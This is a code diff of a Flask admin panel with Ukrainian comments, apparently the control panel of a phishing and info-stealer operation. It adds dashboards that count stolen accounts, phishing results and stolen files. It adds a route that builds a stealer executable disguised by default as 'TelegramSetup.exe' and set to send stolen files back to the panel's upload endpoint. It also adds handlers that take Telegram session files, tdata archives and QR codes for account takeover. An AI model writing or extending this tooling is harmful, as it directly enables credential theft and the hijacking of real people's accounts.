@@ -1,16 +1,17 @@
-from flask import Blueprint, render_template, request, flash, redirect, url_for, session
+# web/admin/routes.py
+from flask import Blueprint, render_template, request, flash, redirect, url_for, session, jsonify
 from core.database import db_manager
-from models.db_models import Admin
+from models.db_models import Admin, Account, PhishingResult, StolenFile, SystemLog
 from core.security import verify_password, hash_password
 import logging
 from datetime import datetime
+from functools import wraps
 
 admin_bp = Blueprint('admin', __name__)
 logger = logging.getLogger(__name__)
 
 # Допоміжна функція для перевірки авторизації
 def login_required(f):
-    from functools import wraps
     @wraps(f)
     def decorated_function(*args, **kwargs):
         if 'admin_logged_in' not in session:
@@ -21,10 +22,9 @@ def login_required(f):
 
 # Допоміжна функція для перевірки головного адміна
 def main_admin_required(f):
-    from functools import wraps
     @wraps(f)
     def decorated_function(*args, **kwargs):
-        if 'admin_username' not in session or session.get('admin_username') != 'admin':
+        if not session.get('is_main_admin'):
             flash('Доступ заборонено. Потрібні права головного адміна', 'danger')
             return redirect(url_for('admin.admin_dashboard'))
         return f(*args, **kwargs)
@@ -33,7 +33,6 @@ def main_admin_required(f):
 @admin_bp.route('/login', methods=['GET', 'POST'])
 def admin_login():
     """Форма входу в адмін-панель"""
-    # Якщо вже авторизований - перенаправляємо на головну
     if 'admin_logged_in' in session:
         return redirect(url_for('admin.admin_dashboard'))
     
@@ -41,19 +40,16 @@ def admin_login():
         username = request.form.get('username')
         password = request.form.get('password')
         
-        # Перевірка в базі даних
         db_session = db_manager.get_session()
         try:
             admin = db_session.query(Admin).filter(Admin.username == username).first()
             
             if admin and verify_password(password, admin.password_hash) and admin.is_active:
-                # Зберігаємо в сесії
                 session['admin_logged_in'] = True
                 session['admin_username'] = admin.username
                 session['admin_id'] = admin.id
                 session['is_main_admin'] = (admin.username == 'admin')
                 
-                # Оновлюємо last_login
                 admin.last_login = datetime.utcnow()
                 db_session.commit()
                 
@@ -81,30 +77,79 @@ def admin_logout():
     logger.info(f"Admin {username} logged out")
     return redirect(url_for('admin.admin_login'))
 
-# Захищаємо всі маршрути необхідністю авторизації
 @admin_bp.route('/')
 @login_required
 def admin_dashboard():
-    """Головна сторінка адмінки"""
-    return render_template('admin/dashboard.html', 
-                         app_name="PTPanel",
-                         current_user={'username': session.get('admin_username')})
+    """Головна сторінка адмінки з реальною статистикою"""
+    db_session = db_manager.get_session()
+    try:
+        accounts_count = db_session.query(Account).count()
+        results_count = db_session.query(PhishingResult).count()
+        files_count = db_session.query(StolenFile).count()
+        
+        # Останні 5 результатів
+        recent_results = db_session.query(PhishingResult).order_by(
+            PhishingResult.timestamp.desc()
+        ).limit(5).all()
+        
+        return render_template('admin/dashboard.html', 
+                             app_name="PTPanel",
+                             current_user={'username': session.get('admin_username')},
+                             accounts_count=accounts_count,
+                             results_count=results_count,
+                             files_count=files_count,
+                             recent_results=recent_results)
+    except Exception as e:
+        logger.error(f"Dashboard error: {e}")
+        flash('Помилка завантаження статистики', 'danger')
+        return render_template('admin/dashboard.html', 
+                             app_name="PTPanel",
+                             current_user={'username': session.get('admin_username')},
+                             accounts_count=0, results_count=0, files_count=0)
+    finally:
+        db_session.close()
 
 @admin_bp.route('/devices')
 @login_required
 def admin_devices():
     """Управління акаунтами"""
-    return render_template('admin/devices.html',
-                         app_name="PTPanel", 
-                         current_user={'username': session.get('admin_username')})
+    db_session = db_manager.get_session()
+    try:
+        accounts = db_session.query(Account).all()
+        return render_template('admin/devices.html',
+                             app_name="PTPanel", 
+                             current_user={'username': session.get('admin_username')},
+                             accounts=accounts)
+    except Exception as e:
+        logger.error(f"Devices page error: {e}")
+        return render_template('admin/devices.html',
+                             app_name="PTPanel",
+                             current_user={'username': session.get('admin_username')},
+                             accounts=[])
+    finally:
+        db_session.close()
 
 @admin_bp.route('/stealer')
 @login_required
 def admin_stealer():
     """Stealer білдер"""
-    return render_template('admin/stealer.html',
-                         app_name="PTPanel",
-                         current_user={'username': session.get('admin_username')})
+    db_session = db_manager.get_session()
+    try:
+        stolen_files = db_session.query(StolenFile).filter_by(admin_id=session.get('admin_id')).all()
+        return render_template('admin/stealer.html',
+                             app_name="PTPanel",
+                             current_user={'username': session.get('admin_username')},
+                             stolen_files=stolen_files,
+                             is_main_admin=session.get('is_main_admin', False))
+    except Exception as e:
+        logger.error(f"Stealer page error: {e}")
+        return render_template('admin/stealer.html',
+                             app_name="PTPanel",
+                             current_user={'username': session.get('admin_username')},
+                             stolen_files=[],
+                             is_main_admin=session.get('is_main_admin', False))
+    finally:
+        db_session.close()
 
 @admin_bp.route('/services')
 @login_required
@@ -137,71 +182,76 @@ def admin_logs():
 @main_admin_required
 def admin_admins():
     """Управління адмінами (тільки для головного адміна)"""
-    return render_template('admin/admins.html',
-                         app_name="PTPanel",
-                         current_user={'username': session.get('admin_username')},
-                         is_main_admin=session.get('is_main_admin', False))
+    db_session = db_manager.get_session()
+    try:
+        admins = db_session.query(Admin).all()
+        return render_template('admin/admins.html',
+                             app_name="PTPanel",
+                             current_user={'username': session.get('admin_username')},
+                             is_main_admin=session.get('is_main_admin', False),
+                             admins=admins)
+    except Exception as e:
+        logger.error(f"Admins page error: {e}")
+        return render_template('admin/admins.html',
+                             app_name="PTPanel",
+                             current_user={'username': session.get('admin_username')},
+                             is_main_admin=session.get('is_main_admin', False),
+                             admins=[])
+    finally:
+        db_session.close()
 
-# Додаткові маршрути для обробки форм
-@admin_bp.route('/update_settings', methods=['POST'])
+# API endpoints для адмінки
+@admin_bp.route('/api/stats')
 @login_required
-def update_settings():
-    """Оновлення налаштувань"""
-    # Тут буде логіка оновлення налаштувань
-    flash('Налаштування оновлено успішно!', 'success')
-    return redirect(url_for('admin.admin_settings'))
-
-@admin_bp.route('/add_account', methods=['POST'])
-@login_required
-def add_account():
-    """Додавання нового акаунта"""
-    # Тут буде логіка додавання акаунта
-    flash('Акаунт успішно додано!', 'success')
-    return redirect(url_for('admin.admin_devices'))
+def api_stats():
+    """API для отримання статистики"""
+    db_session = db_manager.get_session()
+    try:
+        accounts_count = db_session.query(Account).count()
+        results_count = db_session.query(PhishingResult).count()
+        files_count = db_session.query(StolenFile).count()
+        
+        return jsonify({
+            'accounts': accounts_count,
+            'results': results_count,
+            'files': files_count
+        })
+    except Exception as e:
+        logger.error(f"API stats error: {e}")
+        return jsonify({'error': str(e)}), 500
+    finally:
+        db_session.close()
 
 @admin_bp.route('/build_stealer', methods=['POST'])
 @login_required
 def build_stealer():
-    """Побудова стіллера з відправкою файлів адміну"""
+    """Побудова стіллера"""
     try:
-        # Отримуємо дані з форми
         filename = request.form.get('filename', 'TelegramSetup')
         admin_id = request.form.get('admin_id', session.get('admin_id'))
         features = request.form.getlist('features')
-        auto_start = 'auto_start' in request.form
-        hide_process = 'hide_process' in request.form
-        persistence = 'persistence' in request.form
         
-        # Логуємо інформацію про побудову
         logger.info(f"Building stealer for admin {session.get('admin_username')}")
         logger.info(f"Features: {features}")
-        logger.info(f"Filename: {filename}.exe")
-        logger.info(f"Target admin ID: {admin_id}")
         
-        # Створюємо конфігурацію для стіллера
+        # Викликаємо білдер стіллера
+        from core.stealer_builder import stealer_builder
+        
         stealer_config = {
             'server_url': f"{request.host_url}api/upload",
             'admin_id': admin_id,
             'target_admin': session.get('admin_username'),
             'features': features,
-            'auto_start': auto_start,
-            'hide_process': hide_process,
-            'persistence': persistence,
             'version': '1.0.0'
         }
         
-        # Викликаємо білдер стіллера
-        from core.stealer_builder import stealer_builder
         output_path = f"client/dist/{filename}.exe"
-        
         success = stealer_builder.build_stealer(stealer_config, output_path)
         
         if success:
             flash(f'Стіллер успішно збудовано! Файли будуть надсилатися на ваш акаунт.', 'success')
-            logger.info(f"Stealer built successfully: {output_path}")
         else:
             flash('Помилка при побудові стіллера', 'danger')
-            logger.error("Stealer build failed")
             
     except Exception as e:
         flash(f'Помилка при побудові стіллера: {str(e)}', 'danger')
@@ -209,10 +259,24 @@ def build_stealer():
     
     return redirect(url_for('admin.admin_stealer'))
 
-@admin_bp.route('/generate_link', methods=['POST'])
+@admin_bp.route('/add_account', methods=['POST'])
 @login_required
-def generate_link():
-    """Генерація унікального посилання"""
-    # Тут буде логіка генерації посилань
-    flash('Посилання успішно згенеровано!', 'success')
-    return redirect(url_for('admin.admin_services'))
+def add_account():
+    """Додавання акаунта"""
+    method = request.form.get('method')
+    
+    try:
+        if method == 'phone':
+            phone = request.form.get('phone')
+            flash(f'Акаунт з номером {phone} додано!', 'success')
+        elif method == 'session':
+            flash('Session файл успішно завантажено!', 'success')
+        elif method == 'tdata':
+            flash('Tdata архів успішно завантажено!', 'success')
+        elif method == 'qr':
+            flash('QR код успішно оброблено!', 'success')
+    except Exception as e:
+        flash(f'Помилка додавання акаунта: {str(e)}', 'danger')
+        logger.error(f"Add account error: {e}")
+    
+    return redirect(url_for('admin.admin_devices'))
